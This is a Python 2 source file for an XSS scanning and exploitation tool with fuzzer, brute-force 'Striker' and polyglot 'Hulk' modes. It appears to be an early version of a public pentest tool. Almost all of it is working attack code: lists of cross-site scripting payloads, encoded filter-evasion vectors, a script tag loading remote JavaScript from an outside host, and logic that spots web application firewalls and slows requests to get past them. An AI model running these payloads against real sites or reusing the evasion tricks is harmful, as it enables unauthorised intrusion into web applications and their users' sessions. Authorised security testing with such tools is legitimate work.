#!/usr/bin/env python
# -*- coding: utf-8 -*-
#   Required Modules
from __future__ import with_statement
from __future__ import absolute_import
import webbrowser
from urllib import *
import urllib2
from re import search
from urlparse import urlparse, parse_qs, parse_qsl
from HTMLParser import HTMLParser
import sys
import re
import httplib
import socket
import mechanize
from string import whitespace
import os
import time
import socket
from colorama import init , Style, Back,Fore
from io import open
from itertools import izip

# Just some variables

WAF = ""

br = mechanize.Browser()
br.set_handle_robots(False)

evades = [
"\"><img sRc=l oNerrOr=prompt() x>",
"<!--<img src=--><img src=x onerror=alert`` x>",
"<a id=\"a\"href=javascript&colon;alert&lpar;1&rpar; id=\"a\">Click</a>",
"%3c%69%4d%67%20%73%52%63%3d%78%3a%61%6c%65%72%74%60%60%20%6f%4e%45%72%72%6f%72%3d%65%76%61%6c%28%73%72%63%29%3e",
"<iMg sRc=x:alert`` oNError=eval(src)>"
]

vectors = [
"\"><img sRc=l oNerrOr=prompt() x>",
"<!--<img src=--><img src=x onerror=alert`` x>",
"<a id=\"a\"href=javascript&colon;alert&lpar;1&rpar; id=\"a\">Click</a>",
"\\\"><img sRc=l oNerrOr=prompt() x>",
"<iMg sRc=x:alert`` oNError=eval(src)>",
"\"><sCript x>confirm``</script x>",
"'\"><svg/onload=alert()>",
"\"'><iMg sRc=x:alert`` oNError=eval(src)>",
"'\"><svG oNLoad=confirm&#x28;1&#x29>",
"\"><iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\">",
"'\">/*-/*`/*\`/*'/*\"/**/(/* */<sVg/OnloAd=prompt() x>",
"\"'--!><Script x>prompt()</scRiPt x>",
"'\"--!><sVg/oNLoad=confirm()><\"",
"\"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>",
"\"><img src=x onerror=co\u006efir\u006d`1`>",
"\"><svg/onload=co\u006efir\u006d`1`>"
]

xsschecker = "d3v"      #If you want to change it, make sure the word is unlikely to appear on page
URL = ""
NUM_REFLECTIONS = 0           

CURRENTLY_OPEN_TAGS = []
OPEN_TAGS = []                
OPEN_EMPTY_TAG = ""
blacklist = ['html','body','br']   
whitelist = ['input', 'textarea']             

OCCURENCE_NUM = 0
OCCURENCE_PARSED = 0
LIST_OF_PAYLOADS = []

FUZZING_PAYLOADS_BASE = [
    "<script>alert(1)</script>",
    "<sCriPt>alert(1);</sCriPt>",
    "<script src=http://ha.ckers.org/xss.js></script>",
    "<script>alert(String.fromCharCode(88,83,83));</script>",
    "<IMG \"\"\"><script>alert(\"XSS\")</script>\">",
    "<img src=\"blah.jpg\" onerror=\"alert()\"/>"
]

FUZZING_PAYLOADS_START_END_TAG = [
    "\"/><script>alert(1)</script>",
    "\"\/><img src=\"blah.jpg\" onerror=\"alert()\"/>",
    "\"\/><img src=\"blahjpg\" onerror=\"alert()\"/>"
]

FUZZING_PAYLOADS_ATTR = [
    "\"><script>alert(1)</script>",
    "\"><img src=\"blah.jpg\" onerror=\"alert()\"/>",
    "'><script>alert(1)</script>"
]

#######################################################################################################################
#  Fuzzer
#######################################################################################################################
def result(): #Prints result of fuzzing
    for payload in LIST_OF_PAYLOADS:
        print payload
def main(): #Basic structure of fuzzer
    init_resp = make_request(URL)
    if(xsschecker in init_resp.lower()):
        global NUM_REFLECTIONS
        NUM_REFLECTIONS = init_resp.lower().count(xsschecker.lower())
        print "\033[1;32m[+]\033[1;m Number of reflecttions found: " + str(NUM_REFLECTIONS)
        print "\033[1;97m[>]\033[1;m Scanning all the reflections"
        
    else:
        sys.exit("\033[1;31m[-]\033[1;m No reflection found. \n\033[1;33m[!]\033[1;m Automatically launching Hulk!")
        hulk()
    
    for i in range(NUM_REFLECTIONS):
        print "\033[1;97m[>]\033[1;m Testing reflection number: " + str(i + 1)
        global OCCURENCE_NUM
        OCCURENCE_NUM = i+1
        if WAF == "True":
            time.sleep(6)
        else:
            pass
        scan_occurence(init_resp)
        global ALLOWED_CHARS, IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG, CURRENTLY_OPEN_TAGS, OPEN_TAGS, OCCURENCE_PARSED, OPEN_EMPTY_TAG
        ALLOWED_CHARS, CURRENTLY_OPEN_TAGS, OPEN_TAGS = [], [], []
        IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG = False, False, False, False, False
        OCCURENCE_PARSED = 0
        OPEN_EMPTY_TAG = ""
    if result == None:
        print "\033[1;31m[-]\033[1;m No suitable payload found with fuzzing."
        scan_a = raw_input("\033[1;34m[?]\033[1;m Do you want to use striker? [Y/n] ").lower()
        if scan_a == "n":
            print "\033[1;33m[!]\033[1;m Exiting..."
            sys.exit()
        else:
            print "\033[1;31m--------------------------------------------\033[1;m"
            striker()
    else:
        print "\033[1;33m[!]\033[1;m Scan complete. List of suggested payloads:"
        result()
        scan_a = raw_input("\033[1;34m[?]\033[1;m Do you want to use striker? [Y/n] ").lower()
        if scan_a == "n":
            print "\033[1;33m[!]\033[1;m Exiting..."
            sys.exit()
        else:
            print "\033[1;31m--------------------------------------------\033[1;m"
            striker()


def scan_occurence(init_resp): # Takes action according to the reflection of input
    location = html_parse(init_resp)
    if(location == "comment"):
        print "\033[1;33m[!]\033[1;m Reflection found in an HTML comment."
        break_comment()
    elif(location == "script_data"):
        print "\033[1;33m[!]\033[1;m Reflection found as data in a script tag."
    elif(location == "html_data"):
        print "\033[1;33m[!]\033[1;m Reflection found as data or plaintext on the page."
        break_data()
    elif(location == "start_end_tag_attr"):
        print "\033[1;33m[!]\033[1;m Reflection found as an attribute in an empty tag."
        break_start_end_attr()
    elif(location == "attr"):
        print "\033[1;33m[!]\033[1;m Reflection found as an attribute in an HTML tag."
        break_attr()

def html_parse(init_resp):
    parser = MyHTMLParser()
    location = ""
    try:
        parser.feed(init_resp)
    except Exception as e:
        location = str(e)
    except:
        print "\033[1;31m[-]\033[1;m ERROR. Try rerunning?"
    return location

def test_param_check(param_to_check, param_to_compare):
    check_string = "XSSSTART" + param_to_check + "XSSEND"
    compare_string = "XSSSTART" + param_to_compare + "XSSEND"
    check_url = URL.replace(xsschecker, check_string)
    try:
        check_response = make_request(check_url)
    except:
        check_response = ""
    success = False
    
    occurence_counter = 0
    for m in re.finditer('XSSSTART', check_response, re.IGNORECASE):
        occurence_counter += 1
        if((occurence_counter == OCCURENCE_NUM) and (check_response[m.start():m.start()+len(compare_string)].lower() == compare_string.lower())):
            success = True
            break
    return success

def make_request(in_url):
    try:
        req = urllib2.Request(in_url)
        resp = urllib2.urlopen(req)
        return resp.read()
    except:
        print "\n\033[1;31m[-]\033[1;m URL is offline. \n\033[1;33m[!]\033[1;m Exiting..."
        sys.exit()

def break_comment():
    payload = "--><script>alert();</script>"
    if(test_param_check(payload,payload)):
        payload = "--><script>alert();</script>"
        if(test_param_check(payload + "<!--",payload+"<!--")):
            payload = "--><script>alert();</script><!--"
    else:
        if(test_param_check("-->", "-->")):
            clean = test_param_check("<!--", "<!--")
            found = False
            for pl in FUZZING_PAYLOADS_BASE:
                pl = "-->" + pl
                if(clean):
                    pl = pl + "<!--"
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    payload = pl
                    LIST_OF_PAYLOADS.append(pl)
                    found = True
                    break
            if(not found):
                print "\033[1;31m[-]\033[1;m No successful fuzzing attacks. Check manually to confirm."
        else:
            payload = ""
            print "\033[1;31m[-]\033[1;m Cannot escape comment because the --> string needed to close the comment is escaped."
            
    if(payload):
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print "\033[1;32m[+]\033[1;m Suggested Payload: " + Style.BRIGHT + Fore.GREEN + payload
    
def break_data():
    payload = "<script>alert(1);</script>"
    if("textarea" in CURRENTLY_OPEN_TAGS):
        payload = "</textarea>" + payload
    if("title" in CURRENTLY_OPEN_TAGS):
        payload = "</title>" + payload
    if(test_param_check(payload,payload)):
        payload = payload
    else:
        found = False
        for pl in FUZZING_PAYLOADS_BASE:
                if(test_param_check(quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
        if(not found):
            payload = ""
            print "\033[1;31m[-]\033[1;m No successful fuzzing attacks. Check manually to confirm."

    if(payload):
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print "\033[1;32m[+]\033[1;m Suggested Payload: " + Style.BRIGHT + Fore.GREEN + payload

def break_start_end_attr():
    payload = "\"/><script>alert();</script>"
    if(test_param_check(payload,payload)):
        payload = "\"/><script>alert();</script>"
        if(test_param_check(payload+"<br%20attr=\"", payload+"<br attr=\"")):
            payload = "\"/><script>alert();</script><br attr=\""
    else:
        if(test_param_check("/>", "/>")):
            clean = test_param_check("<br%20attr=\"", "<br attr=\"")
            found = False
            for pl in FUZZING_PAYLOADS_START_END_TAG:
                if(clean):
                    pl = pl + "<br attr=\""
                if(test_param_check(quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "\033[1;31m[-]\033[1;m No successful fuzzing attacks. Check manually to confirm."
        else:
            print "\033[1;31m[-]\033[1;m /> cannot be used to end the empty tag. Resorting to invalid HTML."
            payloads_invalid = [
                "\"></" + OPEN_EMPTY_TAG + "><script>alert(1);</script>",
                "\"<div><script>alert(1);</script>"
                ]
            found = False
            for pl in payloads_invalid:
                if(test_param_check(quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "\033[1;31m[-]\033[1;m Cannot escape out of the attribute tag using all fuzzing payloads. Check manually to confirm."
            
    if(payload):
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print "\033[1;33m[!]\033[1;m Parameter was reflected in an attribute of an empty tag."
        print "\033[1;32m[+]\033[1;m Suggested Payload: " + Style.BRIGHT + Fore.GREEN + payload

def break_attr():
    payload = "\"></" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "><script>alert();</script>"
    if(test_param_check(payload,payload)):
        if(test_param_check(payload + "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "%20attr=\"", payload + "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\"")):
            payload = "\"></" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "><script>alert();</script><" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\""
    else:
        if(test_param_check("\">", "\">")):
            clean_str = "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\""
            clean = test_param_check("<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "%20attr=\"", clean_str)
            found = False
            for pl in FUZZING_PAYLOADS_ATTR:
                if(clean):
                    pl = pl + clean_str
                if(test_param_check(quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "\033[1;31m[-]\033[1;m All fuzzing attacks failed. Check manually to confirm."
        else:
            print "\033[1;31m[-]\033[1;m \"> cannot be used to end the empty tag. Resorting to invalid HTML."
            payloads_invalid = [
                "\"<div><script>alert(1);</script>",
                "\"</script><script>alert(1);</script>",
                "\"</><script>alert(1);</script>",
                "\"</><script>alert(1)</script>",
                "\"<><img src=\"blah.jpg\" onerror=\"alert('XSS')\"/>",
                ]
            found = False
            for pl in payloads_invalid:
                if(test_param_check(quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "\033[1;31m[-]\033[1;m Cannot escape out of the attribute tag using all fuzzing payloads. Check manually to confirm."
            
    
    if(payload):
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print "\033[1;32m[+]\033[1;m Suggested Payload: " + Style.BRIGHT + Fore.GREEN + payload
        
#HTML Parser class
class MyHTMLParser(HTMLParser):
    def handle_comment(self, data):
        global OCCURENCE_PARSED
        if(xsschecker.lower() in data.lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
                raise Exception("comment")
    
    def handle_startendtag(self, tag, attrs):
        global OCCURENCE_PARSED
        global OCCURENCE_NUM
        global OPEN_EMPTY_TAG
        if (xsschecker.lower() in str(attrs).lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
                OPEN_EMPTY_TAG = tag
                raise Exception("start_end_tag_attr")
            
    def handle_starttag(self, tag, attrs):
        global CURRENTLY_OPEN_TAGS
        global OPEN_TAGS
        global OCCURENCE_PARSED
        if(tag not in blacklist):
            CURRENTLY_OPEN_TAGS.append(tag)
        if (xsschecker.lower() in str(attrs).lower()):
            if(tag == "script"):
                OCCURENCE_PARSED += 1
                if(OCCURENCE_PARSED == OCCURENCE_NUM):
                    raise Exception("script")
            else:
                OCCURENCE_PARSED += 1
                if(OCCURENCE_PARSED == OCCURENCE_NUM):
                    raise Exception("attr")

    def handle_endtag(self, tag):
        global CURRENTLY_OPEN_TAGS
        global OPEN_TAGS
        global OCCURENCE_PARSED
        if(tag not in blacklist):
            CURRENTLY_OPEN_TAGS.remove(tag)
            
    def handle_data(self, data):
        global OCCURENCE_PARSED
        if (xsschecker.lower() in data.lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
                try:
                    if(CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS)-1] == "script"):
                        raise Exception("script_data")
                    else:
                        raise Exception("html_data")
                except:
                    raise Exception("html_data")

############################################################################
#                        Striker (Forked from BruteXSS)
############################################################################
def striker():
    def re():
        inp = raw_input("\033[1;34m[?]\033[1;m Send the target to Hulk? [Y/n]").lower()
        if inp == 'n':
            print "\033[1;33m[!]\033[1;m Exiting..."
            sys.exit()
        else:
            hulk()
    def complete(p,r,conclusion,d):
        print "\033[1;33m[!]\033[1;m Strike completed."
        if conclusion == 0:
            print "\033[1;31m[-]\033[1;m Given parameters are not vulnerable to XSS."
            re()
        elif conclusion ==1:
            print "\033[1;32m[+]\033[1;m %s Parameter is vulnerable to XSS." %conclusion
        else:
            print "\033[1;32m[+]\033[1;m %s Parameters are vulnerable to XSS."%conclusion
    def GET():
            try:
                try:
                    if WAF == "True":
                        finalurl = urlparse(URL)
                        urldata = parse_qsl(finalurl.query)
                        domain0 = u'{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
                        domain = domain0.replace("https://","").replace("http://","").replace("www.","").replace("/","")
                        paraname = []
                        paravalue = []  
                        lop = unicode(len(evades))
                        print "\033[1;97m[>]\033[1;m Payloads loaded: "+lop
                        print "\033[1;97m[>]\033[1;m Striking the paramter(s)" 
                        parameters = parse_qs(finalurl.query,keep_blank_values=True)
                        path = finalurl.scheme+"://"+finalurl.netloc+finalurl.path
                        for para in parameters: #Arranging parameters and values.
                            for i in parameters[para]:
                                paraname.append(para)
                                paravalue.append(i)
                        total = 0
                        conclusion = 0
                        fpar = []
                        fresult = []
                        progress = 0
                        for param_name, pv in izip(paraname,paravalue): #Scanning the parameter.
                            print "\033[1;97m[>]\033[1;m Testing parameter: "+ param_name
                            fpar.append(unicode(param_name))
                            for x in evades: #
                                validate = x
                                if validate == "":
                                    progress = progress + 1
                                else:
                                    sys.stdout.write("\r\033[1;97m[>]\033[1;m Payloads injected: %i / %s"% (progress,len(evades)))
                                    sys.stdout.flush()
                                    progress = progress + 1
                                    enc = quote_plus(x)
                                    data = path+"?"+param_name+"="+pv+enc
                                    time.sleep(10)
                                    try:
                                        page = br.open(data)
                                        sourcecode = page.read()
                                    except (Exception):
                                        sourcecode = "lol"
                                    try:
                                        if x in sourcecode:
                                            print "\n\033[1;32m[+]\033[1;m XSS Vulnerability Found! \n\033[1;32m[+]\033[1;m Parameter:\t%s\n\033[1;32m[+]\033[1;m Payload:\t%s" %(param_name,x)
                                            fresult.append("  Vulnerable  ")
                                            conclusion = 1
                                            total = total+1
                                            progress = progress + 1
                                            scan_j = raw_input("\033[1;34m[?]\033[1;m Keep the scan running? [y/N] ").lower()
                                            if scan_j == "y":
                                                pass
                                            else:
                                                "\033[1;33m[!]\033[1;m Exiting..."
                                                sys.exit()
                                        else:
                                            conclusion = 0
                                    except:
                                        "\033[1;33m[!]\033[1;m Exiting..."
                                        sys.exit()
                            if conclusion == 0:
                                print "\n\033[1;31m[-]\033[1;m '%s' parameter not vulnerable."%param_name
                                fresult.append("Not Vulnerable")
                                progress = progress + 1
                                pass
                            progress = 0
                        complete(fpar,fresult,total,domain)
                    else:
                        finalurl = urlparse(URL)
                        urldata = parse_qsl(finalurl.query)
                        domain0 = u'{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
                        domain = domain0.replace("https://","").replace("http://","").replace("www.","").replace("/","")
                        paraname = []
                        paravalue = []  
                        lop = unicode(len(vectors))
                        print "\033[1;97m[>]\033[1;m Payloads loaded: "+lop
                        print "\033[1;97m[>]\033[1;m Striking the paramter(s)" 
                        parameters = parse_qs(finalurl.query,keep_blank_values=True)
                        path = finalurl.scheme+"://"+finalurl.netloc+finalurl.path
                        for para in parameters: #Arranging parameters and values.
                            for i in parameters[para]:
                                paraname.append(para)
                                paravalue.append(i)
                        total = 0
                        conclusion = 0
                        fpar = []
                        fresult = []
                        progress = 0
                        for param_name, pv in izip(paraname,paravalue): #Scanning the parameter.
                            print "\033[1;97m[>]\033[1;m Testing parameter: "+ param_name
                            fpar.append(unicode(param_name))
                            for x in vectors: #
                                validate = x
                                if validate == "":
                                    progress = progress + 1
                                else:
                                    sys.stdout.write("\r\033[1;97m[>]\033[1;m Payloads injected: %i / %s"% (progress,len(vectors)))
                                    sys.stdout.flush()
                                    progress = progress + 1
                                    enc = quote_plus(x)
                                    data = path+"?"+param_name+"="+pv+enc
                                    try:
                                        page = br.open(data)
                                    except:
                                                           print Style.BRIGHT + Fore.RED + "\n[-] Target responded with HTTP 404 Error. Consider exiting.."
                                    sourcecode = page.read()
                                    if x in sourcecode:
                                        print "\n\033[1;32m[+]\033[1;m XSS Vulnerability Found! \n\033[1;32m[+]\033[1;m Parameter:\t%s\n\033[1;32m[+]\033[1;m Payload:\t%s" %(param_name,x)
                                        webbrowser.open(URL + x)
                                        fresult.append("  Vulnerable  ")
                                        conclusion = 1
                                        total = total+1
                                        progress = progress + 1
                                        scan_i = raw_input("\033[1;34m[?]\033[1;m Keep the scan running? [y/N] ").lower()
                                        if scan_i == "y":
                                            pass
                                        else:
                                            print "\033[1;33m[!]\033[1;m Exiting..."
                                            sys.exit()
                                    else:
                                        conclusion = 0
                            if conclusion == 0:
                                print "\n\033[1;31m[-]\033[1;m '%s' parameter not vulnerable."%param_name
                                fresult.append("Not Vulnerable")
                                progress = progress + 1
                                pass
                            progress = 0
                        complete(fpar,fresult,total,domain)                   
                except(httplib.HTTPResponse, socket.error), Exit:
                    print "\033[1;31m[-]\033[1;m URL "+domain+" is offline!"
                    re()
            except(KeyboardInterrupt), Exit:
                print "\n\033[1;33m[!]\033[1;m Exiting..."
    print GET()

def POST():
    #def WAF_test():
        #fuzz = URL.replace("d3v", noise)
        #res1 = urlopen(fuzz)
        #if res1.code == 403 or res1.code == 419 or res1.code == 999 or res1.code == 501:
         #   WAF == "True"
          #  print "\033[1;31m[-]\033[1;m Unknown WAF Detected"
           # print "\033[1;33m[!]\033[1;m Delaying requests to avoid WAF detection"
            #time.sleep(3)
       # else:
        #    print "\033[1;32m[+]\033[1;m WAF Status : Offline"
         #   WAF == "False"
          #  pass
    def complete(p,r,conclusion,d):
        print "\033[1;33m[!]\033[1;m Strike completed."
        if conclusion == 0:
            print "\033[1;31m[-]\033[1;m Given parameters are not vulnerable to XSS."
            sys.exit()
        elif conclusion ==1:
            print "\033[1;32m[+]\033[1;m %s Parameter is vulnerable to XSS." %conclusion
            sys.exit()
        else:
            print "\033[1;32m[+]\033[1;m %s Parameters are vulnerable to XSS."%conclusion
            sys.exit()
    try:
        try:
            try:
                #WAF_test()
                br.set_handle_robots(False)
                br.set_handle_refresh(False)
                finalurl = urlparse(URL)
                urldata = parse_qsl(finalurl.query)
                domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
                domain = domain0.replace("https://","").replace("http://","").replace("www.","").replace("/","")
                path = urlparse(URL).scheme+"://"+urlparse(URL).netloc+urlparse(URL).path
                url = URL
                param = str(raw_input("\033[1;34m[?]\033[1;m\033[1;97m Enter post data: \033[1;m"))
                lop = str(len(vectors))
                print "\033[1;97m[>]\033[1;m Payloads loaded: "+lop
                print "\033[1;97m[>]\033[1;m Striking the paramter(s)" 
                params = "http://www.URL.com/?"+param
                finalurl = urlparse(params)
                urldata = parse_qsl(finalurl.query)
                o = urlparse(params)
                parameters = parse_qs(o.query,keep_blank_values=True)
                paraname = []
                paravalue = []
                for para in parameters: #Arranging parameters and values.
                    for i in parameters[para]:
                        paraname.append(para)
                        paravalue.append(i)
                fpar = []
                fresult = []
                total = 0
                progress = 0
                pname1 = [] #parameter name
                payload1 = []
                for pn, pv in zip(paraname,paravalue): #Scanning the parameter.
                    print "\033[1;97m[>]\033[1;m Testing parameter: "+pn
                    fpar.append(str(pn))
                    for i in vectors:
                        #if WAF == "True":
                         #   time.sleep(6)
                        validate = i.translate(None, whitespace)
                        if validate == "":
                            progress = progress + 1
                        else:
                            progress = progress + 1
                            sys.stdout.write("\r\033[1;97m[>]\033[1;m Payloads injected: %i / %s"% (progress,len(vectors)))
                            sys.stdout.flush()
                            pname1.append(pn)
                            payload1.append(str(i))
                            d4rk = 0
                            for m in range(len(paraname)):
                                d = paraname[d4rk]
                                d1 = paravalue[d4rk]
                                tst= "".join(pname1)
                                tst1 = "".join(d)
                                if pn in d:
                                    d4rk = d4rk + 1
                                else:
                                    d4rk = d4rk +1
                                    pname1.append(str(d))
                                    payload1.append(str(d1))
                            data = urlencode(dict(zip(pname1,payload1)))
                            r = br.open(path, data)
                            sourcecode =  r.read()
                            pname1 = []
                            payload1 = []
                            if i in sourcecode:
                                print "\n\033[1;32m[+]\033[1;m XSS Vulnerability Found! \n\033[1;32m[+]\033[1;m Parameter:\t%s\n\033[1;32m[+]\033[1;m Payload:\t%s" %(pn,i)
                                fresult.append("  Vulnerable  ")
                                c = 1
                                total = total+1
                                progress = progress + 1
                                break
                            else:
                                c = 0
                    if c == 0:
                        print "\n\033[1;31m[-]\033[1;m '%s' parameter not vulnerable." %pn
                        fresult.append("Not Vulnerable")
                        progress = progress + 1
                        pass
                    progress = 0
                complete(fpar,fresult,total,domain)
            except(httplib.HTTPResponse, socket.error) as Exit:
                print"\033[1;31m[-]\033[1;m Site "+domain+" is offline!"
                sys.exit()
        except(KeyboardInterrupt) as Exit:
            print("\n\033[1;31m[-]\033[1;m Exiting...")
    except (mechanize.HTTPError,mechanize.URLError) as e:
            print"\n\033[1;31m[-]\033[1;m HTTP ERROR! %s %s"%(e.code,e.reason)
            sys.exit()
#-----------------------------
noise = "<script>alert()</script>"
#-----------------------------
#Show banner and get input

def choice():
    print"\n\033[97m1.\033[1;m Fuzzer"
    print"\033[97m2.\033[1;m Striker"
    print"\033[97m3.\033[1;m Hulk"
    choice = input("\033[97mEnter your choice: \033[1;m")
    if choice == 1:
        print "\033[1;31m--------------------------------------------\033[1;m"
        main()
    if choice == 2:
        print "\033[1;31m--------------------------------------------\033[1;m"
        striker()
    if choice == 3:
        print "\033[1;31m--------------------------------------------\033[1;m"
        hulk()

def hulk():
    print "\033[1;33m[!]\033[1;m Payload 1. Shut 'em up"
    shut = URL.replace("d3v", "</script>';,'\"/><sVg/oNLoad=prompt``>")
    webbrowser.open(shut)
    work = raw_input("\033[1;34m[?]\033[1;m Press enter to execute next payload")
    print "\033[1;33m[!]\033[1;m Payload 2. Brutus"
    brutus = URL.replace("d3v", "'\">jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e")
    webbrowser.open(brutus)
    work = raw_input("\033[1;34m[?]\033[1;m Press enter to execute next payload")
    print "\033[1;33m[!]\033[1;m Payload 3. Counter"
    counter = URL.replace("d3v", "\"';</script>\">'><SCrIPT>alert(String.fromCharCode(88,83,83))</scRipt>")
    webbrowser.open(counter)
    work = raw_input("\033[1;34m[?]\033[1;m Press enter to execute next payload")
    print "\033[1;33m[!]\033[1;m Payload 4. Evil Frame"
    frame = URL.replace("d3v", "\"><iframe+srcdoc%3D\"%26lt%3Bimg+src%26equals%3Bx%3Ax+onerror%26equals%3Balert%26lpar%3B1%26rpar%3B%26gt%3B\">")
    webbrowser.open(frame)
    work = raw_input("\033[1;34m[?]\033[1;m Press enter to execute next payload")
    print "\033[1;33m[!]\033[1;m Payload 5. Marquee Magic"
    magic = URL.replace("d3v", "'\"><mArQuEe oNStart=confirm``>")
    webbrowser.open(magic)
    work = raw_input("\033[1;34m[?]\033[1;m Press enter to execute next payload")
    print "\033[1;33m[!]\033[1;m Payload 6. Cloak"
    cloak = URL.replace("d3v", "%3c%69%4d%67%20%73%52%63%3d%78%3a%61%6c%65%72%74%60%60%20%6f%4e%45%72%72%6f%72%3d%65%76%61%6c%28%73%72%63%29%3e")
    webbrowser.open(cloak)
    print "\033[1;33m[!]\033[1;m Hulk's stamina is over. Exiting..."
    sys.exit()
print "        \033[1;31m\033[1;100mMade with <3 by Somdev Sangwan : TeamUltimate.in\033[1;m"
print"""\033[1;31m _     _ _______ _______ _______  ______ _____ _     _ _______
  \___/  |______ |______    |    |_____/   |   |____/  |______
 _/   \_ ______| ______|    |    |    \_ __|__ |    \_ |______"""
print"\t\033[1;32m       Enter \"help\" to access help manual\033[1;m"
print"\033[1;31m-----------------------------------------------------------------\033[1;m"
URL = raw_input('\033[1;34m[?]\033[1;m\033[1;97m Enter the target URL: \033[1;m')
if URL == "post":
    POST()
if URL == "help":
    print """\033[1;31m--------------------------------------------\033[1;m
\033[1;33m[!]\033[1;m Information  \033[1;34m[?]\033[1;m Prompt  \033[1;31m[-]\033[1;m Bad News  \033[1;32m[+]\033[1;m Good News  \033[1;97m[>]\033[1;m Processing
\n\033[1;100mFuzzer\033[1;m Checks where and how the input gets reflected and then tries to build a payload according to that.
\n\033[1;100mStriker\033[1;m Brute forces all the parameters one by one and opens the POC in a browser window.
\n\033[1;100mHulk\033[1;m Injects polyglots and handpicked payloads into the selected parameter and opens the POC in a browser window.
\033[1;31m--------------------------------------------\033[1;m"""
    sys.exit()
if "=" not in URL:
    print Style.BRIGHT + Fore.RED + "[-] The URL you entered doesn't seem to use GET Method."
    post = raw_input("\033[1;34m[?]\033[1;m Does it use POST method? [Y/n] ")
    if post == "n":
        sys.exit()
    else:
        POST()
if "d3v" not in URL:
    print Style.BRIGHT + Fore.RED + "[-] You have to insert \"d3v\" in the most crucial parameter to use Fuzzer and Hulk.\nFor example: website.com/search.php?q=d3v&category=1"
    sys.exit()
if 'https://' in URL:
    pass
elif 'http://' in URL:
    pass
else:
    URL = "http://" + URL
try:
    fuzz = URL.replace("d3v", noise)
    res1 = urlopen(fuzz)
    if res1.code == 406 or res1.code == 501:
        print"\033[1;31m[-]\033[1;m WAF Detected : Mod_Security"
        print "\033[1;33m[!]\033[1;m Delaying requests to avoid WAF detection"
        time.sleep(3)
        WAF = "True"
        print "\033[1;33m[!]\033[1;m Automatically launching Striker for WAF evasion"
        striker()
    elif res1.code == 999:
        print"\033[1;31m[-]\033[1;m WAF Detected : WebKnight"
        print "\033[1;33m[!]\033[1;m Delaying requests to avoid WAF detection"
        time.sleep(3)
        WAF = "True"
        print "\033[1;33m[!]\033[1;m Automatically launching Striker for WAF evasion"
        striker()
    elif res1.code == 419:
        print"\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP"
        print "\033[1;33m[!]\033[1;m Delaying requests to avoid WAF detection"
        time.sleep(3)
        WAF = "True"
        print "\033[1;33m[!]\033[1;m Automatically launching Striker for WAF evasion"
        striker()
    elif res1.code == 403:
        print "\033[1;31m[-]\033[1;m Unknown WAF Detected"
        print "\033[1;33m[!]\033[1;m Delaying requests to avoid WAF detection"
        time.sleep(3)
        WAF = "True"
        print "\033[1;33m[!]\033[1;m Automatically launching Striker for WAF evasion"
        striker()
    elif res1.code == 302:
        print "\033[1;31m[-]\033[1;m Redirection Detected! Exploitation attempts may fail."
        choice()
    else:
        print "\033[1;32m[+]\033[1;m WAF Status: Offline"
        WAF = "False"
        choice()

except (SyntaxError, NameError, IOError, TypeError, AttributeError):
    print Style.BRIGHT + Fore.RED + "\n[-] There's some problem with the URL. Exiting..."
    sys.exit()
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'), ('Referer', URL), ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding', 'gzip, deflate')]
